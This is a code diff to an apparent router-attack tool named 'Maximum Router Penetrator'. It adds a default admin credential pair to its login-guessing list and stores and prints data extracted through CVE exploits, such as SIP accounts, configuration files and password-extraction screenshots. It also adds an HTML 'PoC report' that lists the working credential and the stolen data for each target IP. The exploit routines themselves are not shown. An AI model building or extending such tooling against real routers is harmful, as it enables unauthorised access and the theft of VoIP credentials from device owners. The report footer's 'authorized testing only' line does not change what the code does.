@@ -171,7 +171,8 @@ class MaximumRouterPenetrator:
             ('admin', 'admin'),
             ('admin', 'support180'),
             ('support', 'support'),
-            ('user', 'user')
+            ('user', 'user'),
+            ('admintelecom', 'telecomadmin')
         ]
         
         # Extended credentials for better success rate
@@ -1053,8 +1054,19 @@ class MaximumRouterPenetrator:
                         result['verified_sip'] = True
                         result['sip_accounts'] = sip_result['accounts']
                 
+                # Store CVE data for HTML report
+                result['cve_data'] = {
+                    'cve_id': cve_result['cve_used'],
+                    'extracted_data': cve_result.get('extracted_data', []),
+                    'endpoint': cve_result.get('endpoint', 'unknown'),
+                    'data_types': cve_result.get('data_types', [])
+                }
+                
                 if verbose:
                     print(f"            ✅ CVE SUCCESS: {cve_result['cve_used']}")
+                    print(f"            📊 Extracted data: {len(cve_result.get('extracted_data', []))} items")
+                    for item in cve_result.get('extracted_data', [])[:5]:  # Show first 5 items
+                        print(f"               • {item}")
             else:
                 if verbose:
                     print(f"            ❌ CVE tests unsuccessful")
@@ -1606,7 +1618,142 @@ class MaximumRouterPenetrator:
             'details': f"Total time: {result['discovery_time']} seconds"
         })
         
+        # Generate HTML PoC Report
+        if result.get('verified_access'):
+            html_report = self._generate_html_poc_report(target_ip, result, router_info, verbose)
+            if html_report['success']:
+                result['html_report'] = html_report['filename']
+                if verbose:
+                    print(f"         📄 HTML PoC Report generated: {html_report['filename']}")
+        
         return result
+    
+    def _generate_html_poc_report(self, target_ip: str, result: dict, router_info: dict, verbose: bool) -> dict:
+        """Generate comprehensive HTML PoC report"""
+        try:
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            filename = f"poc_report_{target_ip}_{timestamp}.html"
+            
+            # Extract data from result
+            working_credential = result.get('successful_credential', result.get('working_credential', 'unknown'))
+            sip_accounts = result.get('sip_accounts', [])
+            config_files = result.get('config_files_found', [])
+            cve_data = result.get('cve_data', {})
+            screenshots = []
+            
+            # Collect screenshot files
+            if result.get('admin_screenshot'):
+                screenshots.append(('Admin Panel', result['admin_screenshot']))
+            if result.get('voip_screenshot'):
+                screenshots.append(('VoIP Page', result['voip_screenshot']))
+            if result.get('password_extraction_screenshot'):
+                screenshots.append(('Password Extraction', result['password_extraction_screenshot']))
+            
+            # Generate HTML content
+            html_content = f"""
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Router Penetration PoC Report - {target_ip}</title>
+    <style>
+        body {{ font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background: #f5f5f5; }}
+        .container {{ max-width: 1200px; margin: 0 auto; background: white; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }}
+        .header {{ background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; padding: 30px; border-radius: 10px 10px 0 0; }}
+        .header h1 {{ margin: 0; font-size: 2.5em; }}
+        .header p {{ margin: 10px 0 0 0; opacity: 0.9; }}
+        .content {{ padding: 30px; }}
+        .section {{ margin-bottom: 30px; padding: 20px; border: 1px solid #e0e0e0; border-radius: 8px; }}
+        .section h2 {{ color: #333; border-bottom: 2px solid #667eea; padding-bottom: 10px; }}
+        .success {{ color: #28a745; font-weight: bold; }}
+        .warning {{ color: #ffc107; font-weight: bold; }}
+        .danger {{ color: #dc3545; font-weight: bold; }}
+        .info {{ color: #17a2b8; font-weight: bold; }}
+        .code {{ background: #f8f9fa; padding: 15px; border-radius: 5px; font-family: 'Courier New', monospace; border-left: 4px solid #667eea; }}
+        .grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }}
+        .card {{ background: #f8f9fa; padding: 15px; border-radius: 5px; border: 1px solid #e0e0e0; }}
+        .screenshot {{ max-width: 100%; height: auto; border: 1px solid #ddd; border-radius: 5px; margin: 10px 0; }}
+        .footer {{ background: #333; color: white; padding: 20px; text-align: center; border-radius: 0 0 10px 10px; }}
+        .status-success {{ background: #d4edda; border-color: #c3e6cb; color: #155724; }}
+        .status-warning {{ background: #fff3cd; border-color: #ffeaa7; color: #856404; }}
+        .status-danger {{ background: #f8d7da; border-color: #f5c6cb; color: #721c24; }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔓 Router Penetration PoC Report</h1>
+            <p>Target: {target_ip} | Generated: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
+            <p>Tool: Maximum Router Penetrator v18.0 Ultimate Professional</p>
+        </div>
+        
+        <div class="content">
+            <div class="section status-success">
+                <h2>✅ Penetration Success</h2>
+                <p><strong>Status:</strong> <span class="success">ACCESS VERIFIED</span></p>
+                <p><strong>Working Credential:</strong> <code>{working_credential}</code></p>
+                <p><strong>Router Brand:</strong> {router_info.get('brand', 'UNKNOWN')}</p>
+                <p><strong>Detection Score:</strong> {router_info.get('detection_score', 0)}</p>
+            </div>
+            
+            <div class="section">
+                <h2>📞 SIP Information</h2>
+                <p><strong>Total SIP Accounts Found:</strong> {len(sip_accounts)}</p>
+                {f'<div class="code">{sip_accounts}</div>' if sip_accounts else '<p class="warning">No SIP accounts found in basic scan</p>'}
+            </div>
+            
+            <div class="section">
+                <h2>📁 Configuration Files</h2>
+                <p><strong>Total Config Files Found:</strong> {len(config_files)}</p>
+                <div class="grid">
+                    {''.join([f'<div class="card"><strong>{f.get("filename", "Unknown")}</strong><br>Size: {f.get("size", 0)} bytes<br>Type: {f.get("type", "Unknown")}</div>' for f in config_files[:10]])}
+                </div>
+                {f'<p class="info">... and {len(config_files) - 10} more files</p>' if len(config_files) > 10 else ''}
+            </div>
+            
+            <div class="section">
+                <h2>🔬 CVE Exploits</h2>
+                {f'<p class="success">Successful CVE: {list(cve_data.keys())[0]}</p>' if cve_data else '<p class="warning">No successful CVE exploits</p>'}
+                {f'<div class="code">{cve_data}</div>' if cve_data else ''}
+            </div>
+            
+            <div class="section">
+                <h2>📸 Evidence Screenshots</h2>
+                {''.join([f'<div><h3>{title}</h3><img src="{filename}" class="screenshot" alt="{title}"></div>' for title, filename in screenshots]) if screenshots else '<p class="warning">No screenshots available</p>'}
+            </div>
+            
+            <div class="section">
+                <h2>🔍 Technical Details</h2>
+                <div class="code">
+                    <strong>Target IP:</strong> {target_ip}<br>
+                    <strong>Access Method:</strong> {result.get('access_method', 'unknown')}<br>
+                    <strong>Verification Score:</strong> {result.get('verification_score', 0)}<br>
+                    <strong>Discovery Time:</strong> {result.get('discovery_time', 0)} seconds<br>
+                    <strong>Total Events:</strong> {len(result.get('events', []))}
+                </div>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>Generated by Maximum Router Penetrator v18.0 Ultimate Professional</p>
+            <p>⚠️ This report is for authorized security testing only</p>
+        </div>
+    </div>
+</body>
+</html>
+            """
+            
+            # Write HTML file
+            with open(filename, 'w', encoding='utf-8') as f:
+                f.write(html_content)
+            
+            return {'success': True, 'filename': filename}
+            
+        except Exception as e:
+            if verbose:
+                print(f"         ❌ HTML report generation error: {str(e)[:50]}")
+            return {'success': False, 'error': str(e)}
     
     def _verify_target_reachable(self, ip: str) -> bool:
         """Verify target is reachable"""
